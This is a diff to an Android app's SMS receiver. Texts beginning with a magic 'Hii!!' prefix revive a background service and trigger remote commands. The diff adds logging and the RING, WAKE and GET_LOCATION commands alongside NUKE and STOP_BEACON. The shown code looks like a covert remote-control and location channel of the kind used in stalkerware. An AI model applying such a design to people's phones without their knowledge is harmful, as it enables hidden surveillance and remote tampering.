@@ -56,7 +56,12 @@ class SmsReceiver : BroadcastReceiver() {
                     } catch(e: Exception) {}
 
                     // --- B. GHOST TUNNEL (Hii!! Protocol) ---
-                    if (body != null && body.startsWith("Hii!!")) {
+                    DebugLogger.log("SMS_PARSER", "Evaluating incoming message from $sender...")
+                    if (body == null) {
+                        DebugLogger.log("SMS_PARSER", "Discarded: Body is null.")
+                    } else if (!body.trimStart().startsWith("Hii!!")) {
+                        DebugLogger.log("SMS_PARSER", "Discarded: Does not start with strictly 'Hii!!'. Found: '${body.take(15).replace('\n', ' ')}...'")
+                    } else {
                         DebugLogger.log("SMS_WAKE", "Magic prefix from $sender. Triggering resurrection.")
                         ServiceResurrector.shock(context)
                         KeepAliveReceiver.scheduleNext(context)
@@ -69,10 +74,15 @@ class SmsReceiver : BroadcastReceiver() {
                             DebugLogger.log("SMS_CMD", "Parsed Command: $cmd | Content: $content")
 
                             when (cmd) {
-                                "NUKE", "STAY_READY", "STOP_BEACON" -> {
-                                    DebugLogger.log("SMS_CMD", "Executing background task: $cmd")
+                                "NUKE", "STAY_READY", "STOP_BEACON", "RING", "WAKE", "GET_LOCATION" -> {
+                                    DebugLogger.log("SMS_CMD", "Executing local SMS task: $cmd")
                                     kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                                        CommandProcessor.checkAndExecute(context)
+                                        val mockCmd = JSONObject().apply {
+                                            put("id", -1)
+                                            put("file_name", cmd)
+                                            put("content", content)
+                                        }
+                                        CommandProcessor.processSingleCommand(context, mockCmd)
                                     }
                                 }
                                 "CODERED", "1", "2", "3", "4", "5", "6", "7" -> {
